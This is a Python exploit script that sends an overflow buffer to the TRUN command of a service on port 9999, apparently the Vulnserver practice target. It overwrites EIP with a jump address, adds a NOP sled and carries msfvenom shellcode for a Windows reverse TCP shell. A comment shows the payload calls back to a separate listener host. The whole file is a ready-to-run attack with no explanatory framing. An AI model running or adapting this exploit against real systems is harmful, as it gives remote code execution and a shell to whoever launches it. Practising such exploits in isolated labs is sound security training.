#!/usr/bin/python

import socket, sys
from time import sleep

padding = "A" * 2002
EIP = "\xeb\x11\x50\x62"
NOPS = "\x90"*15
offset = "B" * (2200 - (len(padding + EIP + NOPS)))

# sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.12 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
shellcode = (
"\xbb\x21\x6e\xed\xbe\xdb\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x12\x83\xc2\x04\x03\x7b\x60\x0f\x4b\x87\x94\x4d"
"\xb4\x77\x65\x32\x3c\x92\x54\x72\x5a\xd7\xc7\x42\x28\xb5\xeb"
"\x29\x7c\x2d\x7f\x5f\xa9\x42\xc8\xea\x8f\x6d\xc9\x47\xf3\xec"
"\x49\x9a\x20\xce\x70\x55\x35\x0f\xb4\x88\xb4\x5d\x6d\xc6\x6b"
"\x71\x1a\x92\xb7\xfa\x50\x32\xb0\x1f\x20\x35\x91\x8e\x3a\x6c"
"\x31\x31\xee\x04\x78\x29\xf3\x21\x32\xc2\xc7\xde\xc5\x02\x16"
"\x1e\x69\x6b\x96\xed\x73\xac\x11\x0e\x06\xc4\x61\xb3\x11\x13"
"\x1b\x6f\x97\x87\xbb\xe4\x0f\x63\x3d\x28\xc9\xe0\x31\x85\x9d"
"\xae\x55\x18\x71\xc5\x62\x91\x74\x09\xe3\xe1\x52\x8d\xaf\xb2"
"\xfb\x94\x15\x14\x03\xc6\xf5\xc9\xa1\x8d\x18\x1d\xd8\xcc\x74"
"\xd2\xd1\xee\x84\x7c\x61\x9d\xb6\x23\xd9\x09\xfb\xac\xc7\xce"
"\xfc\x86\xb0\x40\x03\x29\xc1\x49\xc0\x7d\x91\xe1\xe1\xfd\x7a"
"\xf1\x0e\x28\x2c\xa1\xa0\x83\x8d\x11\x01\x74\x66\x7b\x8e\xab"
"\x96\x84\x44\xc4\x3d\x7f\x0f\x2b\x69\x1b\xc3\xc3\x68\xe3\xca"
"\x4f\xe4\x05\x86\x7f\xa0\x9e\x3f\x19\xe9\x54\xa1\xe6\x27\x11"
"\xe1\x6d\xc4\xe6\xac\x85\xa1\xf4\x59\x66\xfc\xa6\xcc\x79\x2a"
"\xce\x93\xe8\xb1\x0e\xdd\x10\x6e\x59\x8a\xe7\x67\x0f\x26\x51"
"\xde\x2d\xbb\x07\x19\xf5\x60\xf4\xa4\xf4\xe5\x40\x83\xe6\x33"
"\x48\x8f\x52\xec\x1f\x59\x0c\x4a\xf6\x2b\xe6\x04\xa5\xe5\x6e"
"\xd0\x85\x35\xe8\xdd\xc3\xc3\x14\x6f\xba\x95\x2b\x40\x2a\x12"
"\x54\xbc\xca\xdd\x8f\x04\xea\x3f\x05\x71\x83\x99\xcc\x38\xce"
"\x19\x3b\x7e\xf7\x99\xc9\xff\x0c\x81\xb8\xfa\x49\x05\x51\x77"
"\xc1\xe0\x55\x24\xe2\x20"
)

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	s.connect(('192.168.100.29',9999))
	s.recv(1024)

	print '[*] Send buffer'
	s.send("TRUN /.:/ " + padding + EIP + NOPS + shellcode + offset)
	s.close()
	sleep(1)

except Exception as e:
	print(str(e))
	sys.exit()
